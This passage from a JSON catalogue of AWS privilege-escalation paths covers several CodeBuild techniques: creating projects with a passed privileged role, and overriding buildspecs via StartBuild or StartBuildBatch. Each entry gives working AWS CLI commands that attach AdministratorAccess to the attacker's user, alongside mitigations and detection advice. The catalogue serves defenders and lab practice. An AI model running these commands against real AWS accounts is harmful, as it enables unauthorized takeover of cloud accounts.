          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        },
        {
          "permission": "codebuild:BatchGetBuilds",
          "resourceConstraints": "Helpful for monitoring build execution status and verifying successful exploitation"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole`, `codebuild:CreateProject`, and `codebuild:StartBuild` permissions. This principal will create a CodeBuild project with a privileged role attached and start a build to execute code with elevated privileges.\n"
        },
        {
          "id": "codebuild_project",
          "label": "New CodeBuild Project",
          "type": "resource",
          "description": "The newly created CodeBuild project with a malicious buildspec. The project is created with `codebuild:CreateProject` and configured to use a privileged IAM role via `iam:PassRole`. The buildspec contains commands that will execute when the build starts, designed to grant the starting principal administrative access or perform privileged actions.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the codebuild Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the CodeBuild project during creation. This role must trust codebuild.amazonaws.com as a principal in its trust policy. When the build executes, the CodeBuild environment automatically assumes this role and all buildspec commands run with this role's permissions.\n"
        },
        {
          "id": "execute_buildspec",
          "label": "Execute buildspec commands",
          "type": "action",
          "color": "#99ccff",
          "description": "When the build starts, the CodeBuild environment assumes the target role and executes the buildspec commands with the role's permissions. The buildspec can perform various privileged actions such as attaching AdministratorAccess to the starting principal, creating new access keys, modifying IAM policies, or accessing sensitive data.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent) or permissions to modify IAM policies (like `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:CreateAccessKey`), the buildspec successfully elevates the starting principal to administrator. The starting principal now has full administrative access to the AWS account.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin or IAM write permissions, the buildspec can perform some privileged actions. This could include access to sensitive data (S3, RDS, DynamoDB) or the ability to pursue additional escalation paths. The level of additional access depends on the specific permissions of the target role.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or permissions limited to logging/metrics, the buildspec execution may not provide meaningful privilege escalation. However, even limited access could be useful for reconnaissance or as part of a multi-step attack chain.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "codebuild_project",
          "label": "iam:PassRole + codebuild:CreateProject",
          "description": "The attacker creates a new CodeBuild project and passes a privileged role to it. The project is created with a malicious inline buildspec that will execute commands to escalate privileges.\n\nCommand:\n```bash\naws codebuild create-project --name privesc-project \\\n  --source type=NO_SOURCE,buildspec=\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \\\n  --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n```\n\nThe buildspec contains commands to attach AdministratorAccess to the starting principal or perform other privileged actions.\n"
        },
        {
          "from": "codebuild_project",
          "to": "target_role",
          "label": "Project assumes role",
          "description": "When the CodeBuild build is started, the CodeBuild service automatically assumes the target role on behalf of the build environment. All buildspec commands then execute with the permissions granted to this role.\n"
        },
        {
          "from": "target_role",
          "to": "execute_buildspec",
          "label": "codebuild:StartBuild",
          "description": "The attacker starts the build, which triggers execution of the buildspec commands with the target role's permissions. The build environment has full AWS SDK access and can make any API calls allowed by the role.\n\nCommand:\n```bash\naws codebuild start-build --project-name privesc-project\n```\n\nThe buildspec commands execute automatically when the build starts. Monitor with `aws codebuild batch-get-builds --ids BUILD_ID` to track execution.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "admin_outcome",
          "label": "If role has admin or IAM write permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or permissions to modify IAM (like `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:AddUserToGroup`, `iam:CreateAccessKey`), the buildspec successfully elevates the starting principal to administrator. The starting principal gains full control over the AWS account.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "partial_outcome",
          "label": "If role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated permissions but not full admin or IAM write access, the buildspec can perform some privileged actions. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables) or permissions that enable additional privilege escalation techniques through multi-hop attacks.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions (like logs:CreateLogGroup, logs:PutLogEvents), the privilege escalation may not yield meaningful additional access. However, even limited access could be useful for reconnaissance or understanding the environment's configuration.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/codebuild/codebuild-001.yaml"
  },
  {
    "id": "codebuild-002",
    "name": "codebuild:StartBuild",
    "category": "access-resource",
    "services": [
      "codebuild",
      "iam"
    ],
    "description": "A principal with `codebuild:StartBuild` can exploit an existing CodeBuild project that has a privileged service role by using the `--buildspec-override` parameter to execute arbitrary commands with elevated permissions. Unlike the PassRole+CreateProject attack, this path does NOT require `iam:PassRole` or `codebuild:CreateProject` permissions. The attacker can replace the project's buildspec with malicious commands that execute with the project's service role permissions, potentially achieving administrative access if the role is sufficiently privileged.",
    "prerequisites": {
      "admin": [
        "A CodeBuild project must already exist in the account",
        "The existing project must have a service role with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
        "The project must allow buildspec overrides (default behavior unless explicitly disabled)"
      ],
      "lateral": [
        "A CodeBuild project must already exist in the account",
        "The existing project must have a service role with any level of permissions",
        "The project must allow buildspec overrides (default behavior unless explicitly disabled)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws codebuild list-projects --region us-east-1",
          "description": "Discover existing CodeBuild projects in the account (optional but helpful for reconnaissance)"
        },
        {
          "step": 2,
          "command": "aws codebuild batch-get-projects --names EXISTING_PROJECT_NAME --region us-east-1",
          "description": "Inspect the project details to identify the service role ARN and verify it has elevated permissions (optional but helpful)"
        },
        {
          "step": 3,
          "command": "aws codebuild start-build \\\n  --project-name EXISTING_PROJECT_NAME \\\n  --region us-east-1 \\\n  --buildspec-override \"version: 0.2\nphases:\n  build:\n    commands:\n      - echo 'Starting privilege escalation...'\n      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n      - echo 'Successfully attached AdministratorAccess policy'\"\n",
          "description": "Start a build with a malicious buildspec that executes with the project's privileged service role. This example attaches AdministratorAccess to your user account."
        },
        {
          "step": 4,
          "command": "aws codebuild batch-get-builds --ids BUILD_ID --region us-east-1",
          "description": "Monitor the build status to confirm it completed successfully"
        },
        {
          "step": 5,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
        }
      ]
    },
    "limitations": "This path provides administrative access only if the existing CodeBuild project's service role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If the project only has limited permissions, you gain access limited to those permissions. However, even limited access may enable multi-hop privilege escalation attacks.\n\nThis attack requires that an existing CodeBuild project allows buildspec overrides, which is the default behavior. Organizations can disable buildspec overrides in project configuration to prevent this attack vector.\n",
    "recommendation": "Restrict `codebuild:StartBuild` permission using resource-based constraints:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"codebuild:StartBuild\",\n  \"Resource\": \"arn:aws:codebuild:*:ACCOUNT_ID:project/specific-safe-project\"\n}\n```\n\nAdditional security controls:\n- **Least Privilege Service Roles**: Ensure CodeBuild service roles follow least privilege principles and cannot modify IAM permissions\n- **Disable Buildspec Override**: For projects with privileged roles, disable buildspec overrides in the project configuration\n- **CloudTrail Monitoring**: Alert on `StartBuild` API calls with buildspec overrides, especially on projects with privileged roles\n- **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls originating from CodeBuild service principals\n- **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies\n- **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild projects\n- **Regular Audits**: Review CodeBuild projects to identify those with privileged service roles and restrict access accordingly\n- **Separation of Concerns**: Avoid attaching administrative roles to CodeBuild projects; use least-privilege roles specific to build requirements\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown"
    },
    "references": [
      {
        "title": "AWS CodeBuild API Reference - StartBuild",
        "url": "https://docs.aws.amazon.com/codebuild/latest/APIReference/API_StartBuild.html"
      },
      {
        "title": "AWS CodeBuild - Build Specification Reference",
        "url": "https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html"
      }
    ],
    "relatedPaths": [
      "codebuild-001",
      "iam-001",
      "iam-002"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/codebuild_edges.py#L165-L173"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/codebuild-startbuild",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "toolSupport": {
      "pmapper": false,
      "iamVulnerable": false,
      "pacu": false,
      "prowler": false
    },
    "permissions": {
      "required": [
        {
          "permission": "codebuild:StartBuild",
          "resourceConstraints": "Must have permission to start builds on the target CodeBuild project"
        }
      ],
      "additional": [
        {
          "permission": "codebuild:ListProjects",
          "resourceConstraints": "Helpful for discovering existing CodeBuild projects with privileged roles"
        },
        {
          "permission": "codebuild:BatchGetProjects",
          "resourceConstraints": "Useful for viewing project details including service role ARN and permissions"
        },
        {
          "permission": "codebuild:BatchGetBuilds",
          "resourceConstraints": "Helpful for monitoring build execution status and verifying successful exploitation"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `codebuild:StartBuild` permission. This principal can trigger builds on existing CodeBuild projects and override the buildspec with malicious code. Unlike the PassRole+CreateProject attack, this path does NOT require `iam:PassRole` or `codebuild:CreateProject` permissions.\n"
        },
        {
          "id": "codebuild_project",
          "label": "Existing CodeBuild Project",
          "type": "resource",
          "description": "An existing CodeBuild project with a privileged service role. The project must allow buildspec overrides (default behavior unless explicitly disabled). When a build is started with `--buildspec-override`, the project executes the attacker's malicious buildspec commands with the permissions of the project's service role.\n"
        },
        {
          "id": "execute_buildspec",
          "label": "Execute malicious buildspec",
          "type": "action",
          "color": "#99ccff",
          "description": "The CodeBuild project executes the attacker's malicious buildspec commands during the build phase. The buildspec can contain arbitrary shell commands that execute with the project's service role permissions. Common privilege escalation techniques include attaching administrator policies to the starting principal, creating new access keys, or modifying IAM policies.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the CodeBuild project's service role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account. The malicious buildspec can directly modify IAM to grant the starting principal admin access or exfiltrate admin credentials.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the CodeBuild project's service role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3, RDS, DynamoDB, Secrets Manager), the ability to modify other resources, or permissions that enable additional privilege escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the CodeBuild project's service role only has minimal permissions (e.g., basic ECR/S3 access for build artifacts), the privilege escalation may not yield meaningful additional access. However, the attacker still gains code execution capability which could be useful for reconnaissance or as part of a multi-step attack.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "codebuild_project",
          "label": "codebuild:StartBuild with buildspec-override",
          "description": "The attacker starts a build on the target CodeBuild project using the `--buildspec-override` parameter to inject malicious buildspec content. This replaces the project's configured buildspec for this specific build execution.\n\nCommand:\n```bash\naws codebuild start-build \\\n  --project-name EXISTING_PROJECT_NAME \\\n  --region us-east-1 \\\n  --buildspec-override \"version: 0.2\nphases:\n  build:\n    commands:\n      - echo 'Starting privilege escalation...'\n      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n      - echo 'Successfully attached AdministratorAccess policy'\"\n```\n\nThe malicious buildspec is now queued for execution with the project's service role permissions.\n"
        },
        {
          "from": "codebuild_project",
          "to": "execute_buildspec",
          "label": "Build starts and executes commands",
          "description": "CodeBuild automatically starts the build execution and runs the commands defined in the malicious buildspec. These commands execute in the build environment with the project's service role credentials available via the AWS SDK and CLI.\n\nThe attacker can monitor build progress:\n```bash\naws codebuild batch-get-builds --ids BUILD_ID --region us-east-1\n```\n\nBuild logs in CloudWatch Logs show command output, including any privilege escalation results.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the CodeBuild project's service role has AdministratorAccess or equivalent administrative permissions, the malicious buildspec commands can grant the starting principal full administrative access. Common techniques include attaching the AdministratorAccess policy, creating admin access keys, or adding the principal to an admin group.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the CodeBuild project's service role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. The buildspec should be tailored to the available permissions - for example, exfiltrating secrets from Secrets Manager, accessing S3 data, or pursuing additional privilege escalation paths if IAM read permissions exist.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the CodeBuild project's service role only has minimal permissions (typically just ECR pull, S3 artifact access, and CloudWatch Logs), the privilege escalation may not provide meaningful additional access. However, code execution capability and build environment access could still be useful for reconnaissance.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-30T01:31:23Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/codebuild/codebuild-002.yaml"
  },
  {
    "id": "codebuild-003",
    "name": "codebuild:StartBuildBatch",
    "category": "access-resource",
    "services": [
      "codebuild",
      "iam"
    ],
    "description": "A principal with `codebuild:StartBuildBatch` can exploit an existing CodeBuild project that has a privileged service role by using the `--buildspec-override` parameter to execute arbitrary commands with elevated permissions. Similar to `codebuild:StartBuild`, this permission allows injecting malicious buildspecs without requiring `iam:PassRole` or `codebuild:CreateProject` permissions. The attacker can leverage batch build capabilities to execute commands with the project's service role permissions, potentially achieving administrative access if the role is sufficiently privileged.",
    "prerequisites": {
      "admin": [
        "A CodeBuild project must already exist in the account that is configured for batch builds",
        "The existing project must have a service role with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
        "The project must allow buildspec overrides (default behavior unless explicitly disabled)"
      ],
      "lateral": [
        "A CodeBuild project must already exist in the account that is configured for batch builds",
        "The existing project must have a service role with any level of permissions",
        "The project must allow buildspec overrides (default behavior unless explicitly disabled)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws codebuild list-projects --region us-east-1",
          "description": "Discover existing CodeBuild projects in the account (optional but helpful for reconnaissance)"
        },
        {
          "step": 2,
          "command": "aws codebuild batch-get-projects --names EXISTING_PROJECT_NAME --region us-east-1",
          "description": "Inspect the project details to identify the service role ARN and verify it has elevated permissions (optional but helpful)"
        },
        {
          "step": 3,
          "command": "cat > /tmp/malicious-buildspec.yml <<'EOF'\nversion: 0.2\nbatch:\n  fast-fail: false\n  build-list:\n    - identifier: privesc_build\n      buildspec: |\n        version: 0.2\n        phases:\n          build:\n            commands:\n              - echo \"Starting privilege escalation...\"\n              - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n              - echo \"Successfully attached AdministratorAccess policy\"\nEOF\n",
          "description": "Create a malicious buildspec file with batch build format that attaches AdministratorAccess to your user account"
        },
        {
          "step": 4,
          "command": "aws codebuild start-build-batch \\\n  --project-name EXISTING_PROJECT_NAME \\\n  --region us-east-1 \\\n  --buildspec-override file:///tmp/malicious-buildspec.yml\n",
          "description": "Start a build batch with the malicious buildspec override. The buildspec executes with the project's privileged service role permissions."
        },
        {
          "step": 5,
          "command": "aws codebuild batch-get-build-batches --ids BUILD_BATCH_ID --region us-east-1",
          "description": "Monitor the build batch status to confirm it completed successfully (batch builds may take 2-4 minutes)"
        },
        {
          "step": 6,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
        }
      ]
    },
    "limitations": "This path provides administrative access only if the existing CodeBuild project's service role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If the project only has limited permissions, you gain access limited to those permissions. However, even limited access may enable multi-hop privilege escalation attacks.\n\nThis attack requires that:\n1. An existing CodeBuild project allows buildspec overrides (default behavior)\n2. The project is configured to support batch builds\n3. The service role has sufficient permissions to modify IAM policies or principals\n\nOrganizations can disable buildspec overrides in project configuration to prevent this attack vector.\n",
    "recommendation": "Restrict `codebuild:StartBuildBatch` permission using resource-based constraints:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"codebuild:StartBuildBatch\",\n  \"Resource\": \"arn:aws:codebuild:*:ACCOUNT_ID:project/specific-safe-project\"\n}\n```\n\nAdditional security controls:\n- **Least Privilege Service Roles**: Ensure CodeBuild service roles follow least privilege principles and cannot modify IAM permissions\n- **Disable Buildspec Override**: For projects with privileged roles, disable buildspec overrides in the project configuration by setting `overrideConfigurationOverride` to prevent buildspec modifications\n- **Require Source Control Buildspecs**: Configure CodeBuild projects to require buildspecs from source control (GitHub, CodeCommit) rather than allowing inline overrides\n- **CloudTrail Monitoring**: Alert on `StartBuildBatch` API calls with `buildspec-override` parameter, especially on projects with privileged roles\n- **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls originating from CodeBuild service principals\n- **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies\n- **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild batch builds\n- **Regular Audits**: Review CodeBuild projects with batch build capabilities to identify those with privileged service roles and restrict access accordingly\n- **Tag-Based Access Control**: Tag CodeBuild projects with privilege levels and enforce tag-based conditional access policies\n- **Approval Workflows**: Require manual approval for buildspec overrides on sensitive CodeBuild projects with privileged service roles\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown"
    },
    "references": [
      {
        "title": "AWS CodeBuild API Reference - StartBuildBatch",
        "url": "https://docs.aws.amazon.com/codebuild/latest/APIReference/API_StartBuildBatch.html"
      },
      {
        "title": "AWS CodeBuild - Batch Builds",
        "url": "https://docs.aws.amazon.com/codebuild/latest/userguide/batch-build.html"
      },
      {
        "title": "AWS CodeBuild - Build Specification Reference",
        "url": "https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html"
      }
    ],
    "relatedPaths": [
      "codebuild-001",
      "codebuild-002",
      "iam-001",
      "iam-002"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/codebuild_edges.py#L157"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/codebuild-startbuildbatch",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      }
    },
    "toolSupport": {
      "pmapper": false,
      "iamVulnerable": false,
      "pacu": false,
      "prowler": false
    },
    "permissions": {
      "required": [
        {
          "permission": "codebuild:StartBuildBatch",
          "resourceConstraints": "Must have permission to start build batches on the target CodeBuild project"
        }
      ],
      "additional": [
        {
          "permission": "codebuild:ListProjects",
          "resourceConstraints": "Helpful for discovering existing CodeBuild projects with privileged roles"
        },
        {
          "permission": "codebuild:BatchGetProjects",
          "resourceConstraints": "Useful for viewing project details including service role ARN and permissions"
        },
        {
          "permission": "codebuild:BatchGetBuildBatches",
          "resourceConstraints": "Helpful for monitoring build batch execution status and verifying successful exploitation"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with `codebuild:StartBuildBatch` permission on an existing CodeBuild project. Can be an IAM user or role. This principal exploits the existing project's service role by overriding the buildspec with malicious batch build commands.\n"
        },
        {
          "id": "codebuild_project",
          "label": "Existing CodeBuild Project",
          "type": "resource",
          "description": "An existing CodeBuild project configured for batch builds with a service role attached. The project must allow buildspec overrides (default behavior unless explicitly disabled). The attacker leverages this project to execute arbitrary commands with the project's service role permissions.\n"
        },
        {
          "id": "batch_build",
          "label": "Execute Malicious Batch Build",
          "type": "action",
          "color": "#99ccff",
          "description": "The attacker starts a build batch with a malicious buildspec override that contains commands to escalate privileges. The buildspec executes with the CodeBuild project's service role permissions.\n\nCommand:\n```bash\naws codebuild start-build-batch \\\n  --project-name EXISTING_PROJECT_NAME \\\n  --region us-east-1 \\\n  --buildspec-override file:///tmp/malicious-buildspec.yml\n```\n\nThe malicious buildspec typically attaches AdministratorAccess policy to the attacker's user or creates new access keys.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the CodeBuild project's service role has administrative permissions (e.g., AdministratorAccess or equivalent custom policy), the attacker gains full administrative access to the AWS account by executing IAM modification commands within the batch build.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the CodeBuild project's service role has some elevated permissions but not full admin, the attacker gains access limited to those permissions. Check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths that could be chained for further compromise.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the CodeBuild project's service role only has minimal permissions (e.g., CloudWatch Logs write access), there may be no meaningful privilege escalation achieved. The attacker would need to find a different project with a more privileged service role.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "codebuild_project",
          "label": "codebuild:StartBuildBatch with buildspec-override",
          "description": "Execute `codebuild:StartBuildBatch` on the existing CodeBuild project with a malicious buildspec override. The buildspec override replaces the project's original buildspec with attacker-controlled commands that execute in batch build format.\n\nCommand:\n```bash\naws codebuild start-build-batch \\\n  --project-name EXISTING_PROJECT_NAME \\\n  --buildspec-override file:///tmp/malicious-buildspec.yml\n```\n\nThe malicious buildspec uses batch build syntax to execute privilege escalation commands.\n"
        },
        {
          "from": "codebuild_project",
          "to": "batch_build",
          "label": "Batch build assumes service role",
          "description": "The CodeBuild batch build automatically assumes the project's service role via the instance profile. This happens without requiring `iam:PassRole` permission. The batch build inherits all permissions from the service role and can execute any AWS API calls that the role allows.\n"
        },
        {
          "from": "batch_build",
          "to": "admin",
          "label": "If service role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the CodeBuild project's service role has AdministratorAccess or equivalent permissions, the malicious buildspec commands can modify IAM policies and principals to grant the attacker full administrative access. Common techniques include attaching AdministratorAccess policy to the attacker's user account or creating new admin access keys.\n"
        },
        {
          "from": "batch_build",
          "to": "some_perms",
          "label": "If service role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the service role has elevated but non-administrative permissions, the attacker gains access to whatever resources the role can access. This could include sensitive data in S3 buckets, RDS databases, DynamoDB tables, or other privilege escalation opportunities that can be chained together.\n"
        },
        {
          "from": "batch_build",
          "to": "no_access",
          "label": "If service role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the service role only has minimal permissions (e.g., CloudWatch Logs write access for build logs), there may be no meaningful privilege escalation. The attacker would need to identify other CodeBuild projects with more privileged service roles using `codebuild:ListProjects` and `codebuild:BatchGetProjects`.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-30T01:31:23Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/codebuild/codebuild-003.yaml"
  },
  {
    "id": "codebuild-004",
    "name": "iam:PassRole + codebuild:CreateProject + codebuild:StartBuildBatch",
    "category": "service-passrole",
    "services": [
      "iam",
      "codebuild"
    ],
    "description": "A principal with `iam:PassRole`, `codebuild:CreateProject`, and `codebuild:StartBuildBatch` can create a new CodeBuild project configured for batch builds and attach an existing privileged IAM role to it. By starting a build batch with a malicious buildspec, the attacker can execute arbitrary code with the permissions of the attached role, allowing privilege escalation. This variation specifically leverages batch build capabilities, which require both project creation and batch build execution permissions. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts codebuild.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
      ],
      "lateral": [
        "A role must exist that trusts codebuild.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`codebuild.amazonaws.com`]].RoleName'",
          "description": "Discover roles that trust codebuild.amazonaws.com (optional but helpful for finding privileged roles to pass)"
        },
        {
          "step": 2,
          "command": "aws codebuild create-project \\\n  --name privesc-batch-project \\\n  --source type=NO_SOURCE,buildspec=\"version: 0.2\\nbatch:\\n  fast-fail: false\\n  build-list:\\n    - identifier: privesc_build\\n      buildspec: |\\n        version: 0.2\\n        phases:\\n          build:\\n            commands:\\n              - echo \\\"Starting privilege escalation...\\\"\\n              - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n              - echo \\\"Successfully attached AdministratorAccess!\\\"\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \\\n  --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --build-batch-config serviceRole=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n",
          "description": "Create a CodeBuild project configured for batch builds with the privileged role and malicious buildspec in batch format"
        },
        {
          "step": 3,
          "command": "aws codebuild start-build-batch --project-name privesc-batch-project",
          "description": "Start the build batch to execute code with elevated privileges"
        },
        {
          "step": 4,
          "command": "aws codebuild batch-get-build-batches --ids BUILD_BATCH_ID",
          "description": "Monitor the build batch status and wait for completion (batch builds typically take 2-4 minutes)"
        },
        {
          "step": 5,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)"
        }
      ]
    },
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.\n\nThis specific variation requires:\n1. The ability to create CodeBuild projects (`codebuild:CreateProject`)\n2. The ability to start build batches (`codebuild:StartBuildBatch`)\n3. The ability to pass a role to CodeBuild service (`iam:PassRole`)\n4. A role that trusts codebuild.amazonaws.com\n\nBatch builds add complexity compared to standard builds but provide the same privilege escalation capability.\n",
    "recommendation": "Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificCodeBuildRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"codebuild.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- **Separate Permissions**: Avoid granting `codebuild:CreateProject` and `iam:PassRole` to the same principal\n- **Restrict CodeBuild Project Creation**: Limit `codebuild:CreateProject` to specific project name patterns or require approval workflows\n- **Service Role Controls**: Ensure CodeBuild service roles follow least privilege and cannot modify IAM permissions\n- **Monitor CloudTrail**: Alert on `CreateProject` API calls where privileged roles are being passed, and monitor batch build starts with `StartBuildBatch`\n- **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls from CodeBuild service principals\n- **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies\n- **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild and PassRole\n- **Require Source Control**: Configure organizational policies to require buildspecs from source control repositories rather than inline definitions\n- **Role Trust Policies**: Review roles that trust codebuild.amazonaws.com and ensure they follow least privilege\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods",
